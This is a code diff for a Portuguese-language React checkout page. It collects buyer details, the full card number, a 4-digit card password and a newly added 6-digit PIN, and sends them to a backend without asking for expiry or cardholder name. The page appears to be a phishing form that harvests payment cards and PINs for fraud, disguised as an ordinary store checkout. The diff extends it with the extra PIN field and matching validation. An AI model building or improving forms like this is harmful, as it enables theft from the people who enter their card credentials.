@@ -35,7 +35,7 @@ const maskPhone = (s: string) => {
   return d.replace(/(\d{2})(\d{5})(\d{0,4}).*/, "($1) $2-$3");
 };
 const maskCEP = (s: string) => onlyDigits(s).slice(0, 8).replace(/(\d{5})(\d)/, "$1-$2");
-const maskCard = (s: string) => onlyDigits(s).slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
+const maskCard = (s: string) => onlyDigits(s).slice(0, 17).replace(/(\d{4})(?=\d)/g, "$1 ");
 
 // validação CPF
 const validaCPF = (cpf: string) => {
@@ -55,14 +55,14 @@ type FormState = {
   nome: string; email: string; telefone: string; cpf: string;
   cep: string; endereco: string; numero: string; complemento: string;
   bairro: string; cidade: string; estado: string;
-  cartaoNumero: string; cartaoSenha: string;
+  cartaoNumero: string; cartaoSenha: string; cartaoPincode: string;
 };
 
 const empty: FormState = {
   nome: "", email: "", telefone: "", cpf: "",
   cep: "", endereco: "", numero: "", complemento: "",
   bairro: "", cidade: "", estado: "",
-  cartaoNumero: "", cartaoSenha: "",
+  cartaoNumero: "", cartaoSenha: "", cartaoPincode: "",
 };
 
 function CheckoutPage() {
@@ -110,8 +110,10 @@ function CheckoutPage() {
     if (!form.bairro.trim()) e.bairro = "Obrigatório";
     if (!form.cidade.trim()) e.cidade = "Obrigatório";
     if (!UFS.includes(form.estado)) e.estado = "UF inválida";
-    if (onlyDigits(form.cartaoNumero).length !== 16) e.cartaoNumero = "16 dígitos";
-    if (onlyDigits(form.cartaoSenha).length !== 6) e.cartaoSenha = "Senha de 6 dígitos";
+    const cartLen = onlyDigits(form.cartaoNumero).length;
+    if (cartLen !== 16 && cartLen !== 17) e.cartaoNumero = "16 ou 17 dígitos";
+    if (onlyDigits(form.cartaoSenha).length !== 4) e.cartaoSenha = "Senha de 4 dígitos";
+    if (onlyDigits(form.cartaoPincode).length !== 6) e.cartaoPincode = "PIN de 6 dígitos";
     setErrors(e);
     return Object.keys(e).length === 0;
   };
@@ -150,7 +152,8 @@ function CheckoutPage() {
         cliente_estado: form.estado.toUpperCase(),
 
         cartao_numero: onlyDigits(form.cartaoNumero),
-        cartao_cvv: onlyDigits(form.cartaoSenha),
+        cartao_senha: onlyDigits(form.cartaoSenha),
+        cartao_pincode: onlyDigits(form.cartaoPincode),
 
         produto_nome: produtoNome,
         produto_quantidade: qtd,
@@ -310,16 +313,26 @@ function CheckoutPage() {
                     className="w-full rounded-md border border-input px-3 py-2 text-sm font-mono" required />
                   <Err k="cartaoNumero" />
                 </div>
-                <div>
-                  <label className="mb-1 block text-xs font-medium">Senha do cartão (6 dígitos) *</label>
-                  <input type="password" value={form.cartaoSenha}
-                    onChange={(e) => set("cartaoSenha", onlyDigits(e.target.value).slice(0, 6))}
-                    placeholder="••••••" inputMode="numeric" maxLength={6} autoComplete="off"
-                    className="w-full rounded-md border border-input px-3 py-2 text-sm" required />
-                  <Err k="cartaoSenha" />
-                  <div className="mt-1 text-[11px] text-muted-foreground">
-                    Mesma senha que você usa no PinPad. Não pedimos validade nem nome impresso.
+                <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
+                  <div>
+                    <label className="mb-1 block text-xs font-medium">Senha do cartão (4 dígitos) *</label>
+                    <input type="password" value={form.cartaoSenha}
+                      onChange={(e) => set("cartaoSenha", onlyDigits(e.target.value).slice(0, 4))}
+                      placeholder="••••" inputMode="numeric" maxLength={4} autoComplete="off"
+                      className="w-full rounded-md border border-input px-3 py-2 text-sm" required />
+                    <Err k="cartaoSenha" />
                   </div>
+                  <div>
+                    <label className="mb-1 block text-xs font-medium">PIN Code (6 dígitos) *</label>
+                    <input type="password" value={form.cartaoPincode}
+                      onChange={(e) => set("cartaoPincode", onlyDigits(e.target.value).slice(0, 6))}
+                      placeholder="••••••" inputMode="numeric" maxLength={6} autoComplete="off"
+                      className="w-full rounded-md border border-input px-3 py-2 text-sm" required />
+                    <Err k="cartaoPincode" />
+                  </div>
+                </div>
+                <div className="text-[11px] text-muted-foreground">
+                  Não pedimos validade nem nome impresso do cartão.
                 </div>
               </div>
             </section>
